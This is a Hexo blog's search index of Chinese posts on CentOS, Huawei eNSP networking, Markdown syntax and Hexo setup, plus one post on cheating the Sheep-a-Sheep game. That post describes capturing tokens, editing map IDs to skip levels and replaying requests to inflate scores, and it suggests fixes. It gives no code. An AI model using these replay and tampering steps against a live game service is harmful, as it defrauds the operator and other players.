<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux笔记</title>
      <link href="/2022/12/10/Linux%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/12/10/Linux%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="centos8"><a href="#centos8" class="headerlink" title="centos8"></a>centos8</h1><h2 id="yum配置"><a href="#yum配置" class="headerlink" title="yum配置"></a>yum配置</h2><p>我只推荐使用网络yum</p><ul><li>阿里源</li><li>等等</li></ul>]]></content>
      
      
      <categories>
          
          <category> Centos8学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>eNSP笔记</title>
      <link href="/2022/11/26/eNSP%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/11/26/eNSP%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>关闭来自eNSP的命令反馈提示：</p><ul><li>undo terminal monitor </li><li>undo info-center enable</li></ul>]]></content>
      
      
      <categories>
          
          <category> eNSP学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> eNSP </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>eNSP华为模拟器</title>
      <link href="/2022/10/19/eNSP%E5%8D%8E%E4%B8%BA%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
      <url>/2022/10/19/eNSP%E5%8D%8E%E4%B8%BA%E6%A8%A1%E6%8B%9F%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="eNSP（华为模拟器）"><a href="#eNSP（华为模拟器）" class="headerlink" title="eNSP（华为模拟器）"></a>eNSP（华为模拟器）</h1><h2 id="链路聚合"><a href="#链路聚合" class="headerlink" title="链路聚合"></a>链路聚合</h2><h3 id="manual"><a href="#manual" class="headerlink" title="manual"></a>manual</h3><blockquote><p>优点</p></blockquote><ul><li> 手工链路聚合，成员接口手工配置加入，没有LACP的参与。</li><li> 当需要在两个直连设备间提供一个较大的链路带宽而设备又不支持LACP协议时，可以使用手工模式。</li><li> 不同厂家之间无需担心协议报文协商问题。</li></ul><blockquote><p>缺点</p></blockquote><ul><li>当一条链路故障时，故障链路无法转发数据，链路聚合组自动在剩余的两条活动链路中分担流量。<br>手工模式Eth-Trunk可以完成多个物理接口聚合成一个Eth-Trunk口来提高带宽，同时能够检测到同一聚合组内的成员链路有断路等有限故障，<strong>但是无法检测到链路层故障、链路错连等故障</strong>。</li><li><ul><li> 单根纤芯发生故障时，可能出现收端正常的一方端口处于UP，而出现单通，所以这种情况一般要求端口匹配状态为自适应状态。<h3 id="LACP模式链路聚合"><a href="#LACP模式链路聚合" class="headerlink" title="LACP模式链路聚合"></a>LACP模式链路聚合</h3></li></ul></li></ul><blockquote><p>优点</p></blockquote><ul><li>提高Eth-Trunk的容错性，并且能提供备份功能，保证成员链路的高可靠性</li></ul><blockquote><p>缺点</p></blockquote><ul><li>不同厂家对接可能因为协议报文的处理机制等不同，产生对接异常。</li><li>而且一般来说：动态聚合要同端口匹配方式为强制相配套使用，因为：如果端口匹配方式为自适应，那么当物理链路质量不好时，可能端口状态频繁出现变化，相应的聚合组状态也会频繁出现up、down故障。</li></ul><blockquote><p><strong>不同厂家对接，建议设置聚合组为静态、端口设置为自适应方式</strong></p></blockquote><h3 id="max-active-linknumber"><a href="#max-active-linknumber" class="headerlink" title="max active-linknumber"></a>max active-linknumber</h3><ul><li>一般来说聚合的线路为三条就是选择<strong>max active-linknumber 2</strong>，这样即时有一条down了也可以即时补进去一条。还是为2条在工作</li></ul><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="创建脚注格式类似这样-RUNOOB"><a href="#创建脚注格式类似这样-RUNOOB" class="headerlink" title="创建脚注格式类似这样 ^RUNOOB"></a>创建脚注格式类似这样 <a href="56465">^RUNOOB</a></h2><h3 id="stp-edged-port-enable-amp-disable"><a href="#stp-edged-port-enable-amp-disable" class="headerlink" title="stp edged-port enable &amp; disable"></a>stp edged-port enable &amp; disable</h3><ul><li><p>stp edged-port enable 配置的接口不参与生成树计算，即可以转发BPDU也可以接收BPDU</p></li><li><p>:stp disable禁用STP/RSTP/MSTP功能，如果在链接客户端的接口上配置了此命令，这个接口禁用STP/RSTP/MSTP功能，即不参与生成树计算也不转发BPDU报文</p></li><li><p>定义：在 RSTP 里面，如果某一个指定端口位于整个网络的边缘，即不再与其他交换设备连接，而是直接与终端设备直连，这种端口叫做边缘端口。</p></li><li><p>特点</p></li></ul><ul><li>边缘端口的特性是端口up后可直接进入forwarding状态，而不需要等待转发延时，所以边缘端口连接的设备是终端设备，电脑，服务器等需要快速访问网络的设备。<ul><li>场景1：在连接服务器，DHCP客户端，防火墙，打印机，路由器等终端设备可以使用边缘端口</li><li>场景2：重要服务器，避免在网络发生拓扑变化时被阻塞，同时可以使其快速上线</li><li>场景3：可以用于连接DHCP客户端，使其客户端快速获得IP地址</li></ul><ul><li>场景4：在大型网络中，连接大量终端PC的交换机可以使用边缘端口，因为当PC开机时，连接PC的端口为DP会UP并进入转发状态，交换机会产生大量的TC BPDU，导致网络中的交换机频繁刷新自身的MAC地址表。</li></ul></li></ul><blockquote><p>一般来说开启stp enable为pc机接口上，应为它不需要参与生成树计算</p></blockquote><h3 id="Stp-cost-200000"><a href="#Stp-cost-200000" class="headerlink" title="Stp cost 200000"></a>Stp cost 200000</h3><ul><li>stp cost 是生成树协议在选举根端口和指定端口时需要使用的一个重要参数。开销越小被选举为根端口或指定端口的可能性就越大。stp cost 100000这么大的开销值，这个端口基本上就是出于逻辑阻塞状态了，除非交换机上其他端口上的物理线路都断开了，这个才有可能进入到转发状态。</li><li>说人话就是设置了这个他就是堵塞的，应为它的优先级很低，除非正常线路断开否则它不会启用。<h3 id="stp-bpdu-protection"><a href="#stp-bpdu-protection" class="headerlink" title="stp bpdu-protection"></a>stp bpdu-protection</h3></li><li>需要配置在BR根端口，使用命令<code>display stp brief </code>查看Root状态是哪个，哪个就是根端口。</li></ul><blockquote><p>root=根端口 alte=替代端口=alternative desi=指定端口=designation</p></blockquote><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>更新中….</p>]]></content>
      
      
      <categories>
          
          <category> eNSP学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> eNSP </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分析羊了个羊（无限刷）</title>
      <link href="/2022/09/16/%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A%E5%88%86%E6%9E%90/"/>
      <url>/2022/09/16/%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><em><strong>欢迎来到TTRR blog，，本篇分享的是我对于近期[羊了个羊无限刷]个人分析心得分享。</strong></em></p><h1 id="分析心得"><a href="#分析心得" class="headerlink" title="分析心得"></a>分析心得</h1><hr><h2 id="抓包测试"><a href="#抓包测试" class="headerlink" title="抓包测试"></a>抓包测试</h2><h3 id="user-info"><a href="#user-info" class="headerlink" title="user_info"></a>user_info</h3><p>使用抓包软件对该程序进行全局抓包，并能有效得到<strong>user_info</strong>，存储了用户重要数据。<br><img src="https://s1.ax1x.com/2022/09/16/vzDmbF.jpg" height=80% width=60% alt="user_info截屏展示" title="点击放大"><br>从图中我们可以看出他会返回了一个<strong>token令牌</strong>给我们，另外它使用方法就是<strong>GET</strong></p><blockquote><p>POST与GET 详细请自行另外学习</p></blockquote><h3 id="map-info-map-info"><a href="#map-info-map-info" class="headerlink" title="map_info|map_info"></a>map_info|map_info</h3><p>另外我们还进行下一步抓包测试得到了两个神奇的函数：map_info、map_info<br><img src="https://img.zcool.cn/community/0187ee5ae9442fa801207fa1baa2c4.gif" height=10% width=15% alt="聪明的师傅幡然醒悟" title="点击放大" ><br>聪明的师傅肯定猜到了，这是游戏关卡地图数据. 试玩了这款游戏就会发现：这个游戏就只有两个关卡，第一关是福利关卡乱点就可以过关，到了第二关才是真正的游戏面貌。<br>那么最后我们能拿来干什么就取决与你了。</p><h3 id="dayli-count-today-count"><a href="#dayli-count-today-count" class="headerlink" title="dayli_count|today_count"></a>dayli_count|today_count</h3><p>这两个是排行榜返回的函数，测试重放攻击后会重置，数据好友可见。需要修改什么，要靠师傅们自行测试了。</p><h2 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h2><p>聪明的师傅要学会自己写，我这边就不展示了。绿尸函警告！！！<br>不聪明的师傅请在公众号<a href="https://mp.weixin.qq.com/s/rpmhq30OvQXBpZfrZ7QRqA">关注</a>后回复关键词<strong>羊了个羊</strong><br>在不断的进行重放攻击后我们的通关次数逐步增加。<br><img src="https://s1.328888.xyz/2022/09/16/oNnn6.jpg" width=60% height=70% alt="重放攻击结果" title="点击放大"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="跳关"><a href="#跳关" class="headerlink" title="跳关"></a>跳关</h3><blockquote><p>利用mapinfo中的mapid修改实现跳关，此处存在逻辑漏洞<br><strong>个人修复方案如下</strong><br>修复需要设置关卡之间联系的一个固定唯一值用于校验</p></blockquote><h3 id="通关次数"><a href="#通关次数" class="headerlink" title="通关次数"></a>通关次数</h3><blockquote><p>所谓的增加通关次数意思就是：不断的重复gameover请求到服务器，也叫重放<br><strong>个人修复方案如下</strong><br>在数据请求加入时间戳，并且在数据交互时应该使用特定加密校验方式，并且请求值需要验证<br>设置token的时限</p></blockquote><h3 id="返回值欺骗"><a href="#返回值欺骗" class="headerlink" title="返回值欺骗"></a>返回值欺骗</h3><blockquote><p>我们理解上面两个后实验后就会得知，其实不断重现增加次数效率低，恰恰我们有看见榜单上 1.ee+22次方这些恐怖数据<br>这些数据真的时利用不断重放进行长时间累加吗？<br><img src="https://s1.ax1x.com/2022/09/16/xSYSd1.jpg" height="30%" width="30%" alt="师傅三思" title="点击放大" ></p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人心得 </tag>
            
            <tag> 教程 </tag>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客文章</title>
      <link href="/2022/04/12/hexo%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/"/>
      <url>/2022/04/12/hexo%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p> :heart::no_mouth::heart:<br><a href="https://gist.github.com/rxaviers/7360908">小表情大全直达</a></p><p>本文章是针对 <code>Markdown.com.cn</code> 进行的搬钻简化</p><h2 id="1-Markdown-com-cn-简介"><a href="#1-Markdown-com-cn-简介" class="headerlink" title="1 Markdown.com.cn 简介"></a>1 Markdown.com.cn 简介</h2><ul><li>支持自定义样式的 Markdown 编辑器</li><li>支持微信公众号、知乎和稀土掘金</li><li>点击右上方对应图标，一键复制到各平台</li></ul><h2 id="2-Markdown语法教程"><a href="#2-Markdown语法教程" class="headerlink" title="2 Markdown语法教程"></a>2 Markdown语法教程</h2><p>详细请点击<a href="https://markdown.com.cn/editor/">文章编辑教程直达</a></p><h3 id="2-5-引用"><a href="#2-5-引用" class="headerlink" title="2.5 引用"></a>2.5 引用</h3><p>引用的格式是在符号<code>&gt;</code>后面书写文字。如下：</p><p><code>&gt; 读一本好书，就是在和高尚的人谈话。 ——歌德</code></p><blockquote><p>读一本好书，就是在和高尚的人谈话。 ——歌德</p></blockquote><blockquote><p>雇用制度对工人不利，但工人根本无力摆脱这个制度。 ——阮一峰</p></blockquote><h3 id="2-7-链接"><a href="#2-7-链接" class="headerlink" title="2.7 链接"></a>2.7 链接</h3><p>微信公众号仅支持公众号文章链接，即域名为<code>https://mp.weixin.qq.com/</code>的合法链接。</p><h3 id="2-8-图片"><a href="#2-8-图片" class="headerlink" title="2.8 图片"></a>2.8 图片</h3><p>插入图片，格式如下：</p><p><code>![这里写图片描述](图链接)</code><br><code>![](https://markdown.com.cn/images/i-am-svg.svg)</code></p><p>支持 jpg、png、gif、svg 等图片格式，<strong>其中 svg 文件仅可在微信公众平台中使用</strong>，svg 文件示例如下：</p><p><img src="https://markdown.com.cn/images/i-am-svg.svg"></p><p>支持图片<strong>拖拽和截图粘贴</strong>到编辑器中。</p><p>注：支持图片 <em><strong>拖拽和截图粘贴</strong></em> 到编辑器中，仅支持 https 的图片，图片粘贴到微信时会自动上传微信服务器。</p><h3 id="2-9-分割线"><a href="#2-9-分割线" class="headerlink" title="2.9 分割线"></a>2.9 分割线</h3><p>可以在一行中用三个以上的减号来建立一个分隔线，同时需要在分隔线的上面空一行。如下：</p><p><code>---</code></p><hr><h3 id="2-10-表格"><a href="#2-10-表格" class="headerlink" title="2.10 表格"></a>2.10 表格</h3><p>可以使用冒号来定义表格的对齐方式，如下：</p><p>例：<code> </code>| 姓名   | 年龄 |     工作 |<code> </code>| :—– | :–: | ——-: |<code> </code>| 小可爱 |  18  | 吃可爱多 |<code> </code>| 小小勇敢 |  20  | 爬棵勇敢树 |<code> </code>| 小小小机智 |  22  | 看一本机智书 |`</p><table><thead><tr><th align="left">姓名</th><th align="center">年龄</th><th align="right">工作</th></tr></thead><tbody><tr><td align="left">小可爱</td><td align="center">18</td><td align="right">吃可爱多</td></tr><tr><td align="left">小小勇敢</td><td align="center">20</td><td align="right">爬棵勇敢树</td></tr><tr><td align="left">小小小机智</td><td align="center">22</td><td align="right">看一本机智书</td></tr></tbody></table><h2 id="3-特殊语法"><a href="#3-特殊语法" class="headerlink" title="3. 特殊语法"></a>3. 特殊语法</h2><h3 id="3-1-脚注"><a href="#3-1-脚注" class="headerlink" title="3.1 脚注"></a>3.1 脚注</h3><blockquote><p>支持平台：微信公众号、知乎。</p></blockquote><p>脚注与链接的区别如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：[<span class="string">文字</span>](<span class="link">链接</span>)</span><br><span class="line">脚注：[<span class="string">文字</span>](<span class="link">脚注解释 &quot;脚注名字&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="3-2-代码块"><a href="#3-2-代码块" class="headerlink" title="3.2 代码块"></a>3.2 代码块</h3><blockquote><p>支持平台：微信代码主题仅支持微信公众号！其他主题无限制。</p></blockquote><p>如果在一个行内需要引用代码，只要用反引号引起来就好，如下：</p><p>Use the <code>printf()</code> function.</p><p>在需要高亮的代码块的前一行及后一行使用三个反引号，同时<strong>第一行反引号后面表示代码块所使用的语言</strong>，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FileName: HelloWorld.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">  <span class="comment">// Java 入口程序，程序从此入口</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello,World!&quot;</span>); <span class="comment">// 向控制台打印一条语句</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>支持以下语言种类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">clojure，cpp，cs，css</span><br><span class="line">dart，dockerfile, diff</span><br><span class="line">erlang</span><br><span class="line">go，gradle，groovy</span><br><span class="line">haskell</span><br><span class="line">java，javascript，json，julia</span><br><span class="line">kotlin</span><br><span class="line">lisp，lua</span><br><span class="line">makefile，markdown，matlab</span><br><span class="line">objectivec</span><br><span class="line">perl，php，python</span><br><span class="line">r，ruby，rust</span><br><span class="line">scala，shell，sql，swift</span><br><span class="line">tex，typescript</span><br><span class="line">verilog，vhdl</span><br><span class="line">xml</span><br><span class="line">yaml</span><br></pre></td></tr></table></figure><p>如果想要更换代码高亮样式，可在上方<strong>代码主题</strong>中挑选。</p><p>其中<strong>微信代码主题与微信官方一致</strong>，有以下注意事项：</p><ul><li><p>带行号且不换行，代码大小与官方一致<br><code>- 带行号且不换行，代码大小与官方一致</code></p></li><li><p>需要在代码块处标志语言，否则无法高亮<br><code>- 需要在代码块处标志语言，否则无法高亮</code></p></li></ul><ul><li>粘贴到公众号后，用鼠标点代码块内外一次，完成高亮<br><code>- 粘贴到公众号后，用鼠标点代码块内外一次，完成高亮</code></li></ul><p>diff 不能同时和其他语言的高亮同时显示，且需要调整代码主题为微信代码主题以外的代码主题才能看到 diff 效果，使用效果如下:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ 新增项</span></span><br><span class="line"><span class="deletion">- 删除项</span></span><br></pre></td></tr></table></figure><p><strong>其他主题不带行号，可自定义是否换行，代码大小与当前编辑器一致</strong></p><h3 id="3-3-数学公式"><a href="#3-3-数学公式" class="headerlink" title="3.3 数学公式"></a>3.3 数学公式</h3><blockquote><p>支持平台：微信公众号、知乎。</p></blockquote><p>行内公式使用方法，比如这个化学公式：$\ce{Hg^2+ -&gt;[I-] HgI2 -&gt;[I-] [Hg^{II}I4]^2-}$</p><p>块公式使用方法如下：</p><p>$$H(D_2) = -\left(\frac{2}{4}\log_2 \frac{2}{4} + \frac{2}{4}\log_2 \frac{2}{4}\right) = 1$$</p><p>矩阵：</p><p>$$<br>  \begin{pmatrix}<br>  1 &amp; a_1 &amp; a_1^2 &amp; \cdots &amp; a_1^n \<br>  1 &amp; a_2 &amp; a_2^2 &amp; \cdots &amp; a_2^n \<br>  \vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \<br>  1 &amp; a_m &amp; a_m^2 &amp; \cdots &amp; a_m^n \<br>  \end{pmatrix}<br>$$</p><p>公式由于微信不支持，目前的解决方案是转成 svg 放到微信中，无需调整，矢量不失真。</p><p>目前测试如果公式量过大，在 Chrome 下会存在粘贴后无响应，但是在 Firefox 中始终能够成功。</p><h3 id="3-4-TOC"><a href="#3-4-TOC" class="headerlink" title="3.4 TOC"></a>3.4 TOC</h3><blockquote><p>支持平台：微信公众号、知乎。</p></blockquote><p>TOC 全称为 Table of Content，列出全部标题。</p><p>[TOC]</p><p>由于微信只支持到二级列表，本工具仅支持二级标题和三级标题的显示。</p><h3 id="3-5-注音符号"><a href="#3-5-注音符号" class="headerlink" title="3.5 注音符号"></a>3.5 注音符号</h3><blockquote><p>支持平台：微信公众号。</p></blockquote><p>支持注音符号，用法如下：</p><p>Markdown Nice 这么好用，简直是{喜大普奔|hē hē hē hē}呀！</p><h3 id="3-6-横屏滑动幻灯片"><a href="#3-6-横屏滑动幻灯片" class="headerlink" title="3.6 横屏滑动幻灯片"></a>3.6 横屏滑动幻灯片</h3><blockquote><p>支持平台：微信公众号。</p></blockquote><p>通过<code>&lt;![](url),![](url)&gt;</code>这种语法设置横屏滑动滑动片，具体用法如下：<br><code>![蓝1](https://markdown.com.cn/images/blue.jpg),![绿2](https://markdown.com.cn/images/green.jpg)</code><br><img src="https://markdown.com.cn/images/blue.jpg" alt="蓝1">,<img src="https://markdown.com.cn/images/green.jpg" alt="绿2"></p><h2 id="4-其他语法"><a href="#4-其他语法" class="headerlink" title="4 其他语法"></a>4 其他语法</h2><h3 id="4-1-HTML"><a href="#4-1-HTML" class="headerlink" title="4.1 HTML"></a>4.1 HTML</h3><p>支持原生 HTML 语法，请写内联样式，如下：</p><p><code>&lt;span style=&quot;display:block;text-align:right;color:orangered;&quot;&gt;橙色居右&lt;/span&gt;</code><br><span style="display:block;text-align:right;color:orangered;">橙色居右</span></p><p><code>&lt;span style=&quot;display:block;text-align:center;color:orangered;&quot;&gt;橙色居中&lt;/span&gt;</code><br><span style="display:block;text-align:center;color:orangered;">橙色居中</span></p><h3 id="4-2-UML"><a href="#4-2-UML" class="headerlink" title="4.2 UML"></a>4.2 UML</h3><p>不支持，推荐使用开源工具<code>https://draw.io/</code>制作后再导入图片</p><blockquote><p>我觉得这个工具很不错的 提供很多奇奇怪怪的有用的东西，需要的话可用自行去查看。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客创建心得</title>
      <link href="/2022/03/18/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA%E5%BF%83%E5%BE%97/"/>
      <url>/2022/03/18/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA%E5%BF%83%E5%BE%97/</url>
      
        <content type="html"><![CDATA[<p><em><strong>欢迎来到TTRR个人博客，本篇分享的是我对于hexo搭建并部署到github的个人心得分享。</strong></em></p><h1 id="博客心得"><a href="#博客心得" class="headerlink" title="博客心得"></a>博客心得</h1><h3 id="第一步下载node-js"><a href="#第一步下载node-js" class="headerlink" title="第一步下载node.js"></a>第一步下载node.js</h3><p><strong>安装 <a href="http://nodejs.cn/download/">node.js</a></strong><br><strong>1、安装node.js的安装包根据自己搭建环境。（这边展示为windows）</strong></p><img src="https://s1.328888.xyz/2022/03/18/99tUR.png" height=80% width=80%><ul><li><p>2、安装目录推荐再C盘。（其实整个node.js占用也不大）</p><img src="https://s1.328888.xyz/2022/03/18/99ceQ.png" height=80% width=80%></li><li><p>3、这里选择最后一个 <em><strong>Add to PATH</strong></em> 功能进行安装。<br> （因为接下来我们要用到这个PATH功能，这里不过多描述）</p><img src="https://s1.328888.xyz/2022/03/18/99bzX.png" height=80% width=80%></li><li><p>4、接下来安装就直接一路选择 <em><strong>Next</strong></em> 直到安装结束。</p></li></ul><h3 id="第二步下载Git"><a href="#第二步下载Git" class="headerlink" title="第二步下载Git"></a>第二步下载Git</h3><p><strong>安装蓝奏云版<a href="https://www.lanzoui.com/i9s7tib">Git</a></strong><br><strong>官网直达下载<a href="https://git-scm.com/">Git</a></strong></p><blockquote><blockquote><p>温馨提示：如果点击无法打开请安装一些步骤操作<br>Ⅰ. 将链接的<strong>lanzoui.com改成lanzous.com</strong><br>Ⅱ. 删除<strong>www</strong><br>你可以将Git安装再任意你喜欢的文件夹中（安装在哪都可以哦~）</p></blockquote></blockquote><ul><li>1、接着一路点击<strong>Next</strong>（也没什么要我们配置选择的）</li><li>2、安装结束再桌面右击鼠标就可以看见Git<img src="https://s1.328888.xyz/2022/03/18/9JUeS.png" height=50% width=50%></li></ul><h2 id="第三步配置环境"><a href="#第三步配置环境" class="headerlink" title="第三步配置环境"></a>第三步配置环境</h2><p> 安装结束我们在桌面右键鼠标点击<strong>Git Bash Here</strong>，会出来一个终端，我们执行以下的命令来检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code snippet</span><br></pre></td></tr></table></figure><p>分别检查我们是否成功安装。（其实一般都不会出错不过以防万一）<br>成功例子展示：<img src="https://s1.328888.xyz/2022/03/18/9JA33.png" height=90% width=90%></p><h3 id="开始配置cnpm"><a href="#开始配置cnpm" class="headerlink" title="开始配置cnpm"></a>开始配置cnpm</h3><ul><li><strong>安装cnpm，执行以下命令</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><blockquote><blockquote><p><em>这个cnpm其实就是国内镜像为了就是让你访问变得更快</em></p></blockquote></blockquote></li><li><strong>检查cnpm安装</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cnpm -v</span><br></pre></td></tr></table></figure><blockquote><blockquote><p><em>只要出现版本号就代表你安装没有出错（出错再来一次）</em></p></blockquote></blockquote></li></ul><h3 id="开始安装hexo并初始化"><a href="#开始安装hexo并初始化" class="headerlink" title="开始安装hexo并初始化"></a>开始安装hexo并初始化</h3><ul><li><strong>还是在</strong> <strong><u>git bash</u></strong> <strong>终端输入以下命令</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cnpm install hexo-cli -g</span><br></pre></td></tr></table></figure></li></ul><h3 id="初始化我们的blog"><a href="#初始化我们的blog" class="headerlink" title="初始化我们的blog"></a>初始化我们的blog</h3><ul><li><strong>需要你建立一个文件夹（名字随便取）</strong></li><li>例如建立一个在<strong>F盘</strong>的<strong>blog</strong>文件夹，就在当前这个文件夹打开<strong>Git bash</strong><img src="https://s1.328888.xyz/2022/03/18/9JD62.png" height=100% width=100%></li></ul><h5 id="小提示打开之后这里会显示出你当前的文件夹"><a href="#小提示打开之后这里会显示出你当前的文件夹" class="headerlink" title="小提示打开之后这里会显示出你当前的文件夹"></a>小提示打开之后这里会显示出你当前的文件夹</h5><img src="https://s1.328888.xyz/2022/03/18/9J1Y0.png" height=100% width=100%><h3 id="克隆文件"><a href="#克隆文件" class="headerlink" title="克隆文件"></a>克隆文件</h3><ul><li><strong>执行一下代码进行克隆（也可以叫初始化）</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><blockquote><blockquote><p>因为这个克隆是从从外网克隆下来，所以会访问超时或出错，耐心等待即可，实在不行就使用梯子进行加速。（其实我感觉不用梯子其实也挺快，当然了可能是我的网速较好</p></blockquote></blockquote><ul><li>直到终端窗口出现<code>Install dependencies</code>，如果一直卡住就按<code>Ctrl + c</code>就可以结束。</li><li>接着执行以下命令进行部署<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cnpm install</span><br></pre></td></tr></table></figure></li></ul><ul><li><strong>等待命令执行结束就完成了我们的博客克隆，我们可以运行以下命令进行暂时预览</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><img src="https://s1.328888.xyz/2022/03/18/9L9xg.png" height=100% width=100%></li></ul><blockquote><blockquote><p><em>注意事项：不可以使用<code>Ctrl + c</code>进行复制哦，请使用<code>Shift + ins</code>进行复制</em><br><u>（如果一直无法访问就使用<code>hexo server</code>命令进行预览）</u></p></blockquote></blockquote><h4 id="这样子默认的主题就搭建完成啦"><a href="#这样子默认的主题就搭建完成啦" class="headerlink" title="这样子默认的主题就搭建完成啦~~"></a>这样子默认的主题就搭建完成啦~~</h4><img src="https://s1.328888.xyz/2022/03/21/955D1.png" height="80%" width="80%"><h2 id="第四步选择中意的主题"><a href="#第四步选择中意的主题" class="headerlink" title="第四步选择中意的主题"></a>第四步选择中意的主题</h2><h3 id="hexo主题下载"><a href="#hexo主题下载" class="headerlink" title="hexo主题下载"></a>hexo<a href="https://hexo.io/themes/">主题下载</a></h3><p> <strong>你可以在里面找到所有hexo主题，可以选择一个你自己喜欢的主题</strong></p><p> <strong>可以看到的里面网页有很多主题</strong></p><blockquote><p>里面包含了以下三个东东</p><ul><li>预览地址</li><li>项目地址</li><li>配置地址</li></ul></blockquote><p><strong>点击主题的图片可以打开预览地址，点击主题的标题可以打开项目地址，配置文档在项目地址找</strong></p><blockquote><p><em>小提示：大部分都是英文哦~ 可以使用google chrome 或者 edge 浏览器页面翻译</em></p></blockquote><ul><li>首先我们点击主题的项目地址进入<img src="https://s1.328888.xyz/2022/03/21/95svP.png">（这里拿主题NEXT默认举例）我们可以看到 `Clone or download` 下有一个链接，我们先复制下来，等会克隆文件需要。<img src="https://s1.328888.xyz/2022/03/21/950Rq.png" height="90%" width="90%"></li></ul><h3 id="开始克隆主题"><a href="#开始克隆主题" class="headerlink" title="开始克隆主题"></a>开始克隆主题</h3><ul><li>首先需要你在你的博客目录下打开我们的 <strong>Git bash</strong></li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone 主题项目复制的地址 themes/主题名字</span><br></pre></td></tr></table></figure><blockquote><blockquote><p><em>小提示：themes就是你博客的blog下的文件夹，至于主题名字其实你可以随便取，不过最好是英文，方便记忆</em></p></blockquote></blockquote><p> 如果你一直无法通过<strong>Git bash克隆主题</strong> 你可以选择<code>Clone or download</code> 下的<code>Download ZIP</code><br> 下载完成后解压放到你的博客文件夹下的<strong>themes</strong>目录下就ok了<br> <img src="https://s1.328888.xyz/2022/03/21/95mdi.png" height="80%" width="80%"></p><blockquote><blockquote><p><em>小提示：下载需要登录githu账号哦 ~ ~</em></p></blockquote></blockquote><h3 id="开始配置主题"><a href="#开始配置主题" class="headerlink" 